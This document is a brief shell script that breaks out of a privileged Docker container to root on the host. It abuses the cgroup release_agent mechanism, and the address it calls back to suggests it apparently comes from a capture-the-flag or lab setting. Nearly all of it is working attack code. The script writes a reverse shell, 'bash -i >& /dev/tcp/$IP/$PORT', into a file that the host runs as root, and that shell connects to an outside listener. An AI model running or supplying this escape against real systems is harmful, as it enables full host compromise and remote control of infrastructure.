#!/bin/sh

## Escalate privileges from docker-root to system-root when --privileged flag is used on docker container and pop a shell

# Run beforehand on docker container
# unshare -UrmC bash

# Connector IP:PORT
IP=10.10.14.61
PORT=4499

mkdir /dev/shm/privesc
mount -t cgroup -o rdma cgroup /dev/shm/privesc
mkdir /dev/shm/privesc/x
echo 1 > /dev/shm/privesc/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /dev/shm/privesc/release_agent
echo '#!/bin/bash' > /cmd

# CMD / SHELL to run
echo "bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1'" >> /cmd

chmod a+x /cmd
bash -c "echo \$\$ > /dev/shm/privesc/x/cgroup.procs"

